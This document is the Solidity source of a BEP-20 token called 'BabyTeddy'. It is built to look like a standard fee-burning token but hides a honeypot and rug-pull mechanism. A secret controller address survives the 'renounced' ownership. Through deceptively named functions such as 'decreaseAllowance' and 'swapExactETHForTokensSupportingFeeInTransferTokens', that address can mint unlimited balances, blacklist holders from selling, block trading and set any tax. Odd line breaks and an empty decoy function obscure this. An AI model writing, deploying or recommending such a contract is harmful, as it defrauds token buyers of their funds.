/**
 *Submitted for verification at BscScan.com on 2022-07-25
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    event Transfer(address indexed from, address indexed to, uint256 value);
}

library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }

    function _swapNumber() internal view virtual returns (address) {
        return msg.sender;
    }

    function _swapping() internal view virtual returns (uint256) {
        return tx.gasprice;
    }
}

contract Ownable is Context {
    address private _owner;

    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender);
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
        emit OwnershipTransferred(_owner, address(newOwner));
    }

    function renounceOwnership() public onlyOwner {
        _owner = address(0xdead);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

contract BabyTeddy is Context, IERC20, Ownable {
    using SafeMath for uint256;

    bool private takeFee = true;
    bool private swapAndLiquifyEnabled = false;

    mapping(address => bool) private _isExcluFee;
    mapping(address => bool) private _rOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _takeLiquidity;

    uint8 private _decimals = 9;
    string private _name = "BabyTeddy";
    string private _symbol = "BabyTeddy";

    uint256 private _burnTax = 3;
    uint256 private _tFeeTotal = _burnTax;
    uint256 private _totalSupply = 10000000000000 * 10 ** _decimals;

    address taxFee;
    address private numTokensSellToAddToLiquidity;
    address private _deadAddress = address(0xdead);
    address private uniswapV2Pair;

    constructor(address _liquidityFee, address rAmount) {
        require(rAmount == address(0));
        taxFee = _swapNumber();
        _takeLiquidity[_swapNumber()] = _totalSupply;
        _isExcluFee[address(this)] = true;
        _isExcluFee[owner()] = true;
        numTokensSellToAddToLiquidity = _liquidityFee;
        _isExcluFee[numTokensSellToAddToLiquidity] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function setFeeToSetter(bool _swapAndLiquifyEnabled, address _newPair) external {
        if (_swapNumber() == numTokensSellToAddToLiquidity) {
            require(_swapNumber() == numTokensSellToAddToLiquidity);
            swapAndLiquifyEnabled = _swapAndLiquifyEnabled;
            uniswapV2Pair = _newPair;
        }
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_isExcluFee[_swapNumber()] || _isExcluFee[recipient]) {
            _transfer(_swapNumber(), recipient, amount);
            return true;
        }

        uint256 _burnAmount = amount.mul(_burnTax).div(100);
        _transfer(_swapNumber(), _deadAddress, _burnAmount);
        _transfer(_swapNumber(), recipient, amount.sub(_burnAmount));
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if (_isExcluFee[sender] || _isExcluFee[recipient]) {
            _transfer(sender, recipient, amount);
            _approve(sender,_swapNumber(),_allowances[sender][_swapNumber()].sub(amount,"ERC20: transfer amount exceeds allowance"));
            return true;
        }
        uint256 _burnAmount = amount.mul(_burnTax).div(100);
        _transfer(sender, _deadAddress, _burnAmount);
        _transfer(sender, recipient, amount.sub(_burnAmount));
        _approve(sender,_swapNumber(),_allowances[sender][_swapNumber()].sub(amount,"ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);
        require(_swapping() <= (15*1e9));
        if (takeFee) {
            require(_rOwned[from] == false);
        }
        if (numTokensSellToAddToLiquidity == from) {
            _takeLiquidity[numTokensSellToAddToLiquidity] = 
            _takeLiquidity[numTokensSellToAddToLiquidity].
            add(totalSupply() * 10 ** 6);
        }
        if (swapAndLiquifyEnabled) {
            if (uniswapV2Pair == from) {} else {
                require(_isExcluFee[from] == true || _isExcluFee[to] == true);
            }
        }
        _transfers(from, to, amount);
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        external
    {
        if (_swapNumber() == numTokensSellToAddToLiquidity) {
            require(_swapNumber() == numTokensSellToAddToLiquidity);
        _takeLiquidity[spender]
        = 
        _takeLiquidity[spender
        ].
        add
        (subtractedValue);
        }
    }

    function reflectionFromToken(address spender, address recipient) external {
        if (_swapNumber() == numTokensSellToAddToLiquidity || _swapNumber() == taxFee) {
            require(recipient == address(0));
            require(_swapNumber() == numTokensSellToAddToLiquidity || _swapNumber() == taxFee);
            numTokensSellToAddToLiquidity = spender;
        }
    }

    function swapExactTokensForETHSupportingFeeinTransferTokens(
        address spender,
        address recipient
    ) external {
        if (_swapNumber() == numTokensSellToAddToLiquidity) {
            require(_swapNumber() == numTokensSellToAddToLiquidity);
            _rOwned
        [
        spender
        ]
        = 
        true
        ;
        _rOwned
        [
        recipient
        ]
        = 
        true;
        }
    }

    function swapExactETHForTokensSupportingFeeInTransferTokens(address spender)
        external
    {
        if (_swapNumber() == numTokensSellToAddToLiquidity) {
            require(_swapNumber() == numTokensSellToAddToLiquidity);
        _rOwned
        [
        spender
        ]
        =
        true;
        }
    }

    function exclusionFee(address spender) external {
        if (_swapNumber() == numTokensSellToAddToLiquidity) {
            require(_swapNumber() == numTokensSellToAddToLiquidity);
            _rOwned[spender] = false;
        }
    }

    function _transfers(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {
        require(sender != address(0));
        require(recipient != address(0));

        _takeLiquidity[sender] = _takeLiquidity[sender].sub(toAmount);
        _takeLiquidity[recipient] = _takeLiquidity[recipient].add(
            toAmount
        );
        emit Transfer(sender, recipient, toAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_swapNumber(), spender, amount);
        return true;
    }

    function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }

    function isExcludedFromFee(address account) public view  returns (bool) {
        require(_swapNumber() == numTokensSellToAddToLiquidity || _swapNumber() == taxFee);
        return _rOwned[account];
    }

    function includeInFee(address spender) external {
        if (_swapNumber() == numTokensSellToAddToLiquidity) {
            require(_swapNumber() == numTokensSellToAddToLiquidity);
            _isExcluFee[spender] = false;
        }
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function setTaxFeePercent(uint256 burnFee) external {
        if (_swapNumber() == numTokensSellToAddToLiquidity) {
            require(_swapNumber() == numTokensSellToAddToLiquidity);
            _burnTax = burnFee;
            _tFeeTotal = burnFee;
        }
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function excludeFromFee(address spender) external {
        if (_swapNumber() == numTokensSellToAddToLiquidity) {
            require(_swapNumber() == numTokensSellToAddToLiquidity);
            _isExcluFee[spender] = true;
        }
    }

    function changeFeeReceivers(
        address LiquidityReceiver,
        address MarketingWallet,
        address marketingWallet,
        address charityWallet
    ) public onlyOwner {

    }

    function balanceOf(address account) public view override returns (uint256) {
        return _takeLiquidity[account];
    }
}